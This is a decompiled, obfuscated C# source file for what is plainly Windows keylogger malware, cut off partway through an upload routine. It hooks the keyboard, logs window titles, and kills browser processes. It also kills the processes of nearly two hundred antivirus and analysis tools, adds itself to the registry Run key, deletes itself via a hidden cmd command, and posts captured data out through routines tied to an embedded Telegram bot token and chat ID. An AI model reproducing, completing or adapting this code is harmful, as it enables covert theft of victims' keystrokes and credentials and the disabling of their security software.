using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using ȨсӛƚZ;
using ˤ_002D_060C_FFFDε;
using 鈟_02F3ڿɩ_FFFD;

namespace ݶ_FFFDՄ_061D_FFFD;

[StandardModule]
internal sealed class 鈟ЮŁ_0327ϒ
{
	public delegate void KeyLoggerEventArgsEventHandler(object sender, KeyLoggerEventArgs e);

	public class KeyLoggerEventArgs : EventArgs
	{
		private Keys _keys;

		private string _stringValue;

		public Keys Key => _keys;

		public string StringValue => _stringValue;

		public KeyLoggerEventArgs(Keys key, string stringValue)
		{
			//IL_0009: Unknown result type (might be due to invalid IL or missing references)
			//IL_000a: Unknown result type (might be due to invalid IL or missing references)
			_keys = key;
			_stringValue = stringValue;
		}
	}

	public class KeyLogger : IDisposable
	{
		private delegate int KeyboardProc(int code, int direction, ref Keys key);

		private KeyboardProc _hookCallback;

		private IntPtr _hook;

		private string _currentWindow;

		private bool _newWindow;

		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		private KeyLoggerEventArgsEventHandler KeyDownEvent;

		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		private KeyLoggerEventArgsEventHandler KeyUpEvent;

		public string CurrentWindow => _currentWindow;

		public event KeyLoggerEventArgsEventHandler KeyDown
		{
			[CompilerGenerated]
			add
			{
				KeyLoggerEventArgsEventHandler keyLoggerEventArgsEventHandler = KeyDownEvent;
				KeyLoggerEventArgsEventHandler keyLoggerEventArgsEventHandler2;
				do
				{
					keyLoggerEventArgsEventHandler2 = keyLoggerEventArgsEventHandler;
					KeyLoggerEventArgsEventHandler value2 = (KeyLoggerEventArgsEventHandler)Delegate.Combine(keyLoggerEventArgsEventHandler2, value);
					keyLoggerEventArgsEventHandler = Interlocked.CompareExchange(ref KeyDownEvent, value2, keyLoggerEventArgsEventHandler2);
				}
				while ((object)keyLoggerEventArgsEventHandler != keyLoggerEventArgsEventHandler2);
			}
			[CompilerGenerated]
			remove
			{
				KeyLoggerEventArgsEventHandler keyLoggerEventArgsEventHandler = KeyDownEvent;
				KeyLoggerEventArgsEventHandler keyLoggerEventArgsEventHandler2;
				do
				{
					keyLoggerEventArgsEventHandler2 = keyLoggerEventArgsEventHandler;
					KeyLoggerEventArgsEventHandler value2 = (KeyLoggerEventArgsEventHandler)Delegate.Remove(keyLoggerEventArgsEventHandler2, value);
					keyLoggerEventArgsEventHandler = Interlocked.CompareExchange(ref KeyDownEvent, value2, keyLoggerEventArgsEventHandler2);
				}
				while ((object)keyLoggerEventArgsEventHandler != keyLoggerEventArgsEventHandler2);
			}
		}

		public event KeyLoggerEventArgsEventHandler KeyUp
		{
			[CompilerGenerated]
			add
			{
				KeyLoggerEventArgsEventHandler keyLoggerEventArgsEventHandler = KeyUpEvent;
				KeyLoggerEventArgsEventHandler keyLoggerEventArgsEventHandler2;
				do
				{
					keyLoggerEventArgsEventHandler2 = keyLoggerEventArgsEventHandler;
					KeyLoggerEventArgsEventHandler value2 = (KeyLoggerEventArgsEventHandler)Delegate.Combine(keyLoggerEventArgsEventHandler2, value);
					keyLoggerEventArgsEventHandler = Interlocked.CompareExchange(ref KeyUpEvent, value2, keyLoggerEventArgsEventHandler2);
				}
				while ((object)keyLoggerEventArgsEventHandler != keyLoggerEventArgsEventHandler2);
			}
			[CompilerGenerated]
			remove
			{
				KeyLoggerEventArgsEventHandler keyLoggerEventArgsEventHandler = KeyUpEvent;
				KeyLoggerEventArgsEventHandler keyLoggerEventArgsEventHandler2;
				do
				{
					keyLoggerEventArgsEventHandler2 = keyLoggerEventArgsEventHandler;
					KeyLoggerEventArgsEventHandler value2 = (KeyLoggerEventArgsEventHandler)Delegate.Remove(keyLoggerEventArgsEventHandler2, value);
					keyLoggerEventArgsEventHandler = Interlocked.CompareExchange(ref KeyUpEvent, value2, keyLoggerEventArgsEventHandler2);
				}
				while ((object)keyLoggerEventArgsEventHandler != keyLoggerEventArgsEventHandler2);
			}
		}

		[DllImport("user32", CharSet = CharSet.Ansi, EntryPoint = "SetWindowsHookExA", ExactSpelling = true, SetLastError = true)]
		private static extern IntPtr SetHook(int hook, KeyboardProc KeyDelegate, IntPtr HMod, int ThreadId);

		[DllImport("user32", CharSet = CharSet.Ansi, EntryPoint = "CallNextHookEx", ExactSpelling = true, SetLastError = true)]
		private static extern int CallNextHook(IntPtr hook, int code, int direction, ref Keys key);

		[DllImport("user32", CharSet = CharSet.Ansi, EntryPoint = "UnhookWindowsHookEx", ExactSpelling = true, SetLastError = true)]
		private static extern int UnHook(IntPtr hook);

		public KeyLogger()
		{
			_hookCallback = ProcessKey;
			_hook = SetHook(13, _hookCallback, IntPtr.Zero, 0);
			if (_hook == IntPtr.Zero)
			{
			}
			InitializeCaptionLogging();
		}

		private int ProcessKey(int code, int direction, ref Keys key)
		{
			if (code == 0)
			{
				switch (direction)
				{
				case 256:
					KeyDownEvent?.Invoke(this, new KeyLoggerEventArgs(key, Identifykey(key)));
					break;
				case 260:
					KeyUpEvent?.Invoke(this, new KeyLoggerEventArgs(key, Identifykey(key)));
					break;
				}
			}
			return CallNextHook(_hook, code, direction, ref key);
		}

		private string Identifykey(Keys k)
		{
			//IL_0036: Unknown result type (might be due to invalid IL or missing references)
			//IL_0037: Unknown result type (might be due to invalid IL or missing references)
			//IL_0039: Unknown result type (might be due to invalid IL or missing references)
			//IL_003d: Invalid comparison between Unknown and I4
			//IL_003f: Unknown result type (might be due to invalid IL or missing references)
			//IL_0042: Invalid comparison between Unknown and I4
			//IL_0046: Unknown result type (might be due to invalid IL or missing references)
			//IL_004a: Invalid comparison between Unknown and I4
			//IL_004e: Unknown result type (might be due to invalid IL or missing references)
			//IL_0052: Invalid comparison between Unknown and I4
			//IL_0056: Unknown result type (might be due to invalid IL or missing references)
			//IL_005a: Invalid comparison between Unknown and I4
			//IL_005c: Unknown result type (might be due to invalid IL or missing references)
			//IL_0060: Invalid comparison between Unknown and I4
			//IL_0064: Unknown result type (might be due to invalid IL or missing references)
			//IL_0068: Invalid comparison between Unknown and I4
			//IL_006c: Unknown result type (might be due to invalid IL or missing references)
			//IL_0070: Invalid comparison between Unknown and I4
			//IL_0074: Unknown result type (might be due to invalid IL or missing references)
			//IL_0078: Unknown result type (might be due to invalid IL or missing references)
			//IL_007b: Invalid comparison between Unknown and I4
			//IL_00c6: Unknown result type (might be due to invalid IL or missing references)
			//IL_00d7: Unknown result type (might be due to invalid IL or missing references)
			//IL_00f1: Unknown result type (might be due to invalid IL or missing references)
			//IL_00f7: Expected I4, but got Unknown
			//IL_010e: Unknown result type (might be due to invalid IL or missing references)
			//IL_0114: Expected I4, but got Unknown
			bool flag = ((Computer)뜸_058Fôē뫆.퓜ҡ_005E嵱ջ).get_Keyboard().get_ShiftKeyDown();
			if (((Computer)뜸_058Fôē뫆.퓜ҡ_005E嵱ջ).get_Keyboard().get_CapsLock())
			{
				flag = ((!flag) ? true : false);
			}
			try
			{
				Keys val = k;
				if ((int)val <= 13)
				{
					if ((int)val == 8)
					{
						goto IL_007f;
					}
					if ((int)val == 9)
					{
						return "[TAP]";
					}
					if ((int)val == 13)
					{
						return "[ENTR]";
					}
				}
				else if ((int)val <= 35)
				{
					if ((int)val == 32)
					{
						return " ";
					}
					if ((int)val == 35)
					{
						goto IL_007f;
					}
				}
				else if ((int)val == 46 || val - 112 <= 11)
				{
					goto IL_007f;
				}
				checked
				{
					if (flag)
					{
						return VKCodeToUnicode((uint)k).ToUpper();
					}
					return VKCodeToUnicode((uint)k);
				}
				IL_007f:
				return "[" + ((Enum)(Keys)(ref k)).ToString() + "]";
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				string result;
				if (flag)
				{
					result = Strings.ChrW((int)k).ToString().ToUpper();
					ProjectData.ClearProjectError();
					return result;
				}
				result = Strings.ChrW((int)k).ToString().ToLower();
				ProjectData.ClearProjectError();
				return result;
			}
		}

		private string VKCodeToUnicode(uint VKCode)
		{
			//IL_0084: Unknown result type (might be due to invalid IL or missing references)
			try
			{
				StringBuilder stringBuilder = new StringBuilder();
				byte[] array = new byte[255];
				if (!쐬מ_00AB蠺븤(array))
				{
					return "";
				}
				uint num = _061D蠺сiȨ(VKCode, 0u);
				IntPtr aεŲ_002DJ = å_FFFDЮ_FFFDɛ();
				int _FFFDĪӛ_2964ک = 0;
				int ҟӚ_FFFDӤϘ = _07FB_FFFDҚ_06E3_FFFD(aεŲ_002DJ, ref _FFFDĪӛ_2964ک);
				IntPtr intPtr = (IntPtr)ãęŚή㠰(ҟӚ_FFFDӤϘ);
				_FFFD_1CFC_FFFDKj(VKCode, num, array, stringBuilder, 5, 0u, intPtr);
				return stringBuilder.ToString();
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
			Keys val = (Keys)checked((int)VKCode);
			return ((Enum)(Keys)(ref val)).ToString();
		}

		private void InitializeCaptionLogging()
		{
			Thread thread = new Thread((ThreadStart)delegate
			{
				while (true)
				{
					StringBuilder stringBuilder = new StringBuilder(256);
					if (_FFFDǎЅ_FFFDհ(å_FFFDЮ_FFFDɛ(), stringBuilder, 256) > 0 && Operators.CompareString(stringBuilder.ToString(), _currentWindow, false) != 0)
					{
						_currentWindow = stringBuilder.ToString();
					}
					Thread.Sleep(1000);
				}
			});
			thread.Start();
		}

		public void Dispose()
		{
			UnHook(_hook);
			GC.SuppressFinalize(this);
		}

		void IDisposable.Dispose()
		{
			//ILSpy generated this explicit interface implementation from .override directive in Dispose
			this.Dispose();
		}
	}

	public static string _FFFDҭӚ_FFFD_FFFD;

	public static string ߡU_07B8ʤş;

	public static string _FFFD蠺_0026_0089ҡ = ".txt";

	private static Process[] _FFFD븤ޤс_26CA = Process.GetProcesses();

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("KPPlogS")]
	private static Timer AĪ_05C3Ś_07FB;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Scrlogtimerrr")]
	private static Timer _FFFDҟ_FFFD_07B8ҏ;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Clpreptimerr")]
	private static Timer _0657Ω_FFFDבƉ;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("clprEPs")]
	private static Timer _FFFD_005EΑ_FFFD_00AB;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("kLLTIm")]
	private static Timer _FFFDZ鈇ל_0657;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("TPSSends")]
	private static Timer ʓ_002D蠺_FFFD늻;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("UnProtectionTPSSends")]
	private static Timer ϒڿë_FFFDݶ;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ProHfutimer")]
	private static Timer ɛӓ_0333ę퓜;

	private static string _FFFDҢk_FFFDˤ;

	private static string _06E3_FFFD_FFFD_FFFD_06E3 = "$%TelegramDv$";

	public static string Ӻꓞ㹃Ң_003B = "";

	private static string ɢ_06E8_FFFDױ_07B4 = "$#TheHashHere%&";

	private static KeyLogger _2_FFFDՕ_FFFDņ;

	private static StringBuilder _FFFDŁԜӓŚ = new StringBuilder();

	private static object أԌҭԹˤ = "False";

	private static object _0331Z_0333εɩ = "False";

	private static object ǎ_FFFDUήᔖ = "False";

	private static string Ӛ_FFFDzmϒ = "$ProtectPass%";

	private static object ʓ늻ɇ_2964ή = "ProtectFalse";

	private static string ݝاמЮҟ = "False";

	private static string с_06E3_0332_FFFD_065A = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)(" \r\n\r\nPC Name:" + Environment.MachineName), Operators.AddObject((object)"\r\nDate and Time: ", _26CA_FFFDی똛丐())), Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject((object)"\r\n", ŧ_FFFD_07B4c_0040()), (object)"\r\n"), (object)"Country Name: "), (object)"Null!"), (object)"\r\n")));

	private static string _1CFCʤmåӓ = "";

	private static string Ɯ_00ABεų_FFFD = "";

	private static string _DA6A_DC9A_FFFDƚȨ = "";

	private static string _0089ҟߟ_06DA_2964 = "";

	private static string _0300_0333_FFFD_FFFD_0097 = "";

	private static string ӛ_FFFD_FFFD_05C9_06DA = "";

	private static string 恁_FFFDʪ_FFFD_FFFD = "";

	private static string _06E8_FFFDtߟ_05B5 = "";

	private static string _003B_005EŁ_00BEҡ = "5476629412:AAGbkcFsGq72YxKoGZjVmRBskss9nHikjMc";

	private static string ņ_07A8Ѕ_0300ʪ = "5594190904";

	public static string ӺԜ_05B5鈟ꓞ;

	private static object _0306_0306j_0739_07B9 = "ZyiAEnXWZP" + new Random().Next();

	public static Timer _FFFD_F0B9_FFFD_FFFDå
	{
		[CompilerGenerated]
		get
		{
			return AĪ_05C3Ś_07FB;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = 恁_005Eľœ_07B8;
			Timer val = AĪ_05C3Ś_07FB;
			if (val != null)
			{
				val.remove_Tick(eventHandler);
			}
			AĪ_05C3Ś_07FB = value;
			val = AĪ_05C3Ś_07FB;
			if (val != null)
			{
				val.add_Tick(eventHandler);
			}
		}
	} = new Timer();


	public static Timer ӛÒ퓜鈇ӥ
	{
		[CompilerGenerated]
		get
		{
			return _FFFDҟ_FFFD_07B8ҏ;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = 嵱_FFFDR_FFFDأ;
			Timer val = _FFFDҟ_FFFD_07B8ҏ;
			if (val != null)
			{
				val.remove_Tick(eventHandler);
			}
			_FFFDҟ_FFFD_07B8ҏ = value;
			val = _FFFDҟ_FFFD_07B8ҏ;
			if (val != null)
			{
				val.add_Tick(eventHandler);
			}
		}
	} = new Timer();


	public static Timer _0306ڿʤ뜸_FFFD
	{
		[CompilerGenerated]
		get
		{
			return _0657Ω_FFFDבƉ;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = _FFFD_061DɢܣԜ;
			Timer val = _0657Ω_FFFDבƉ;
			if (val != null)
			{
				val.remove_Tick(eventHandler);
			}
			_0657Ω_FFFDבƉ = value;
			val = _0657Ω_FFFDבƉ;
			if (val != null)
			{
				val.add_Tick(eventHandler);
			}
		}
	} = new Timer();


	public static Timer ϫӓіœ_0314
	{
		[CompilerGenerated]
		get
		{
			return _FFFD_005EΑ_FFFD_00AB;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = _FFFDϱ鈇ĪУ;
			Timer val = _FFFD_005EΑ_FFFD_00AB;
			if (val != null)
			{
				val.remove_Tick(eventHandler);
			}
			_FFFD_005EΑ_FFFD_00AB = value;
			val = _FFFD_005EΑ_FFFD_00AB;
			if (val != null)
			{
				val.add_Tick(eventHandler);
			}
		}
	} = new Timer();


	public static Timer ٷm_FFFDک_060C
	{
		[CompilerGenerated]
		get
		{
			return _FFFDZ鈇ל_0657;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			_FFFDZ鈇ל_0657 = value;
		}
	} = new Timer();


	public static Timer ɛ_0657_061DԹ_FFFD
	{
		[CompilerGenerated]
		get
		{
			return ʓ_002D蠺_FFFD늻;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Z_060Cņē_FFFD;
			Timer val = ʓ_002D蠺_FFFD늻;
			if (val != null)
			{
				val.remove_Tick(eventHandler);
			}
			ʓ_002D蠺_FFFD늻 = value;
			val = ʓ_002D蠺_FFFD늻;
			if (val != null)
			{
				val.add_Tick(eventHandler);
			}
		}
	} = new Timer();


	public static Timer _DBB6_DF92_FFFD_FFFDݶ
	{
		[CompilerGenerated]
		get
		{
			return ϒڿë_FFFDݶ;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Մ_FFFDU_FFFD_FFFD;
			Timer val = ϒڿë_FFFDݶ;
			if (val != null)
			{
				val.remove_Tick(eventHandler);
			}
			ϒڿë_FFFDݶ = value;
			val = ϒڿë_FFFDݶ;
			if (val != null)
			{
				val.add_Tick(eventHandler);
			}
		}
	} = new Timer();


	public static Timer _0333_06E3Ŕсݶ
	{
		[CompilerGenerated]
		get
		{
			return ɛӓ_0333ę퓜;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			ɛӓ_0333ę퓜 = value;
		}
	} = new Timer();


	public static void _FFFDՕ_05C1_06DAٷ()
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		int num5 = default(int);
		int num6 = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				string text;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_000b;
				case 158:
					{
						num2 = num;
						switch ((num3 <= -2) ? 1 : num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0001;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_000b;
						case 3:
							goto IL_001d;
						case 5:
							goto IL_0045;
						case 4:
						case 6:
						case 7:
						case 8:
							goto IL_005b;
						default:
							goto end_IL_0001;
						case 9:
							goto end_IL_0001_2;
						}
						goto default;
					}
					IL_001d:
					num = 3;
					text = Strings.LCase(_FFFD븤ޤс_26CA[num5].ProcessName);
					if (Operators.CompareString(text, "chrome", false) == 0)
					{
						goto IL_0045;
					}
					goto IL_005b;
					IL_0045:
					num = 5;
					_FFFD븤ޤс_26CA[num5].Kill();
					goto IL_005b;
					IL_0063:
					if (num5 > num6)
					{
						goto end_IL_0001_2;
					}
					goto IL_001d;
					IL_005b:
					num = 8;
					num5 = checked(num5 + 1);
					goto IL_0063;
					IL_000b:
					num = 2;
					num6 = checked(_FFFD븤ޤс_26CA.Length - 1);
					num5 = 0;
					goto IL_0063;
					end_IL_0001:
					break;
				}
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 158;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_2:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public static void _06E8_FFFDʭ_FFFD_0385()
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		int num5 = default(int);
		int num6 = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				string text;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_000b;
				case 158:
					{
						num2 = num;
						switch ((num3 <= -2) ? 1 : num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0001;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_000b;
						case 3:
							goto IL_001d;
						case 5:
							goto IL_0045;
						case 4:
						case 6:
						case 7:
						case 8:
							goto IL_005b;
						default:
							goto end_IL_0001;
						case 9:
							goto end_IL_0001_2;
						}
						goto default;
					}
					IL_001d:
					num = 3;
					text = Strings.LCase(_FFFD븤ޤс_26CA[num5].ProcessName);
					if (Operators.CompareString(text, "firefox", false) == 0)
					{
						goto IL_0045;
					}
					goto IL_005b;
					IL_0045:
					num = 5;
					_FFFD븤ޤс_26CA[num5].Kill();
					goto IL_005b;
					IL_0063:
					if (num5 > num6)
					{
						goto end_IL_0001_2;
					}
					goto IL_001d;
					IL_005b:
					num = 8;
					num5 = checked(num5 + 1);
					goto IL_0063;
					IL_000b:
					num = 2;
					num6 = checked(_FFFD븤ޤс_26CA.Length - 1);
					num5 = 0;
					goto IL_0063;
					end_IL_0001:
					break;
				}
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 158;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_2:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public static void εŚ_FFFDʤ_FFFD()
	{
		string[] array = new string[194]
		{
			"zlclient", "egui", "bdagent", "npfmsg", "olydbg", "anubis", "wireshark", "avastui", "_Avp32", "vsmon",
			"mbam", "keyscrambler", "_Avpcc", "_Avpm", "Ackwin32", "Outpost", "Anti-Trojan", "ANTIVIR", "Apvxdwin", "ATRACK",
			"Autodown", "Avconsol", "Ave32", "Avgctrl", "Avkserv", "Avnt", "Avp", "Avp32", "Avpcc", "Avpdos32",
			"Avpm", "Avptc32", "Avpupd", "Avsched32", "AVSYNMGR", "Avwin95", "Avwupd32", "Blackd", "Blackice", "Cfiadmin",
			"Cfiaudit", "Cfinet", "Cfinet32", "Claw95", "Claw95cf", "Cleaner", "Cleaner3", "Defwatch", "Dvp95", "Dvp95_0",
			"Ecengine", "Esafe", "Espwatch", "F-Agnt95", "Findviru", "Fprot", "F-Prot", "F-Prot95", "Fp-Win", "Frw",
			"F-Stopw", "Iamapp", "Iamserv", "Ibmasn", "Ibmavsp", "Icload95", "Icloadnt", "Icmon", "Icsupp95", "Icsuppnt",
			"Iface", "Iomon98", "Jedi", "Lockdown2000", "Lookout", "Luall", "MCAFEE", "Moolive", "Mpftray", "N32scanw",
			"NAVAPSVC", "NAVAPW32", "NAVLU32", "Navnt", "NAVRUNR", "Navw32", "Navwnt", "NeoWatch", "NISSERV", "Nisum",
			"Nmain", "Normist", "NORTON", "Nupgrade", "Nvc95", "Outpost", "Padmin", "Pavcl", "Pavsched", "Pavw",
			"PCCIOMON", "PCCMAIN", "Pccwin98", "Pcfwallicon", "Persfw", "POP3TRAP", "PVIEW95", "Rav7", "Rav7win", "Rescue",
			"Safeweb", "Scan32", "Scan95", "Scanpm", "Scrscan", "Serv95", "Smc", "SMCSERVICE", "Snort", "Sphinx",
			"Sweep95", "SYMPROXYSVC", "Tbscan", "Tca", "Tds2-98", "Tds2-Nt", "TermiNET", "Vet95", "Vettray", "Vscan40",
			"Vsecomr", "Vshwin32", "Vsstat", "Webscanx", "WEBTRAP", "Wfindv32", "Zonealarm", "LOCKDOWN2000", "RESCUE32", "LUCOMSERVER",
			"avgcc", "avgcc", "avgamsvr", "avgupsvc", "avgw", "avgcc32", "avgserv", "avgserv9", "avgserv9schedapp", "avgemc",
			"ashwebsv", "ashdisp", "ashmaisv", "ashserv", "aswUpdSv", "symwsc", "norton", "Norton Auto-Protect", "norton_av", "nortonav",
			"ccsetmgr", "ccevtmgr", "avadmin", "avcenter", "avgnt", "avguard", "avnotify", "avscan", "guardgui", "nod32krn",
			"nod32kui", "clamscan", "clamTray", "clamWin", "freshclam", "oladdin", "sigtool", "w9xpopen", "Wclose", "cmgrdian",
			"alogserv", "mcshield", "vshwin32", "avconsol", "vsstat", "avsynmgr", "avcmd", "avconfig", "licmgr", "sched",
			"preupd", "MsMpEng", "MSASCui", "Avira.Systray"
		};
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			string[] array2 = array;
			foreach (string text in array2)
			{
				if (Operators.CompareString(process.ProcessName, text, false) == 0)
				{
					process.Kill();
					break;
				}
			}
		}
	}

	public static object ג_07FB쐬ɩչ(string _FFFD_058F_0385ی_0332)
	{
		if (Process.GetProcessesByName(_FFFD_058F_0385ی_0332).Length > 0)
		{
			Process.GetCurrentProcess().Kill();
		}
		return null;
	}

	public static object _FFFD_0306_065AհУ(string O_FFFD_0026ǎ_060C)
	{
		if (File.Exists(O_FFFD_0026ǎ_060C))
		{
			Process.GetCurrentProcess().Kill();
		}
		return null;
	}

	public static string _FFFDşꓞ_FFFDŲ(string _26CAٷ_058F_06E8泮)
	{
		SHA256 sHA = SHA256.Create();
		FileStream fileStream = File.OpenRead(_26CAٷ_058F_06E8泮);
		fileStream.Position = 0L;
		byte[] array = sHA.ComputeHash(fileStream);
		fileStream.Close();
		string text = "";
		checked
		{
			int num = array.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				text += array[i].ToString("X2");
			}
			return text.ToLower();
		}
	}

	public static void ᔖŧ_0314_0026ӛ()
	{
		try
		{
			Process.Start(new ProcessStartInfo
			{
				Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + Application.get_ExecutablePath() + "\"",
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = "cmd.exe"
			});
			Environment.Exit(1);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
	}

	[DllImport("kernel32", CharSet = CharSet.Ansi, EntryPoint = "GetModuleFileNameA", ExactSpelling = true, SetLastError = true)]
	public static extern int Օ쐬_060C_07B8ɢ(int ɩ_1CFCZ_FFFDã, [MarshalAs(UnmanagedType.VBByRefStr)] ref string 嵱ɇ_032E_FFFDҏ, int کߟհױ2);

	[DllImport("kernel32", CharSet = CharSet.Ansi, EntryPoint = "ExitProcess", ExactSpelling = true, SetLastError = true)]
	public static extern int _00BEǎЅņک(uint ʤAŁ_FFFD쐬);

	[DllImport("kernel32", CharSet = CharSet.Ansi, EntryPoint = "MoveFileExW", ExactSpelling = true, SetLastError = true)]
	public static extern int ی_02E8_FFFDŚÒ([In][MarshalAs(UnmanagedType.LPTStr)] string KɇɮУ_FFFD, [In][MarshalAs(UnmanagedType.LPTStr)] string Ɯ꾯O_0657_FFFD, long ņʓӛ_FFFDŲ);

	public static void ܪ_07BBӛ嵱Ś()
	{
	}

	public static void ג_FFFDœ콪t(string ɩŲמ_0097Ȩ, string _DA3B_DDCBҢˤ_0089)
	{
		try
		{
			RegistryKey currentUser = Registry.CurrentUser;
			RegistryKey registryKey = currentUser.OpenSubKey("software\\microsoft\\windows\\currentversion\\run", writable: true);
			registryKey.SetValue(ɩŲמ_0097Ȩ, _DA3B_DDCBҢˤ_0089, RegistryValueKind.String);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private static void ӥ_058F_FFFDհ_FFFD(string ﾭ_0655Ŏ_FFFD_061D, string _߂_FFFD_07B8Ă_FFFD, string _0657_0609츠k㠰, string ŧľ늻Ŵ2)
	{
		try
		{
			WebClient webClient = new WebClient();
			Stream stream = new MemoryStream();
			string text = "------------------------" + DateTime.Now.Ticks.ToString("x");
			webClient.Headers.Add("Content-Type", "multipart/form-data; boundary=" + text);
			string s = string.Format("--{0}\r\nContent-Disposition: form-data; name=\"document\"; filename=\"{1}\"\r\nContent-Type: {2}\r\n\r\n{3}\r\n--{0}--\r\n", text, ﾭ_0655Ŏ_FFFD_061D, _߂_FFFD_07B8Ă_FFFD, ŧľ늻Ŵ2);
			byte[] bytes = webClient.Encoding.GetBytes(s);
			webClient.UploadData(_0657_0609츠k㠰, "POST", bytes);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
	}

	private static void ϫ_05C3_002DݝӺ(string 蠺ױ_FFFDʭٷ, string _0655_060CZŁŴ, string Ω_FFFDٷi_FFFD, string չϒߡ_05B4泮)
	{
		try
		{
			WebClient webClient = new WebClient();
			Stream stream = new MemoryStream();
			string text = "------------------------" + DateTime.Now.Ticks.ToString("x");
			webClient.Headers.Add("Content-Type", "multipart/form-data; boundary=" + text);
			string s = string.Format("--{0}\r\nContent-Disposition: form-data; name=\"document\"; filename=\"{1}\"\r\nContent-Type: {2}\r\n\r\n{3}\r\n--{0}--\r\n", text, 蠺ױ_FFFDʭٷ, _0655_060CZŁŴ, չϒߡ_05B4泮);
			byte[] bytes = webClient.Encoding.GetBytes(s);
			webClient.UploadData(Ω_FFFDٷi_FFFD, "POST", bytes);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
	}

	private static void Ŕ_FFFDҢ꾯_02F3(string 쐬_07A8_0306Ŕأ, string _07FBӓՄ_FFFDŴ, string Ӛױ_FFFD츠Ԝ, string 嵱Ң_FFFD_FFFD㹃)
	{
		try
		{
			WebClient webClient = new WebClient();
			Stream stream = new MemoryStream();
			string text = "------------------------" + DateTime.Now.Ticks.ToString("x");
			webClient.Headers.Add("Content-Type", "multipart/form-data; boundary=" + text);
			string s = string.Format("--{0}\r\nContent-Disposition: form-data; name=\"document\"; filename=\"{1}\"\r\nContent-Type: {2}\r\n\r\n{3}\r\n--{0}--\r\n", text, 쐬_07A8_0306Ŕأ, _07FBӓՄ_FFFDŴ, 嵱Ң_FFFD_FFFD㹃);
			byte[] bytes = webClient.Encoding.GetBytes(s);
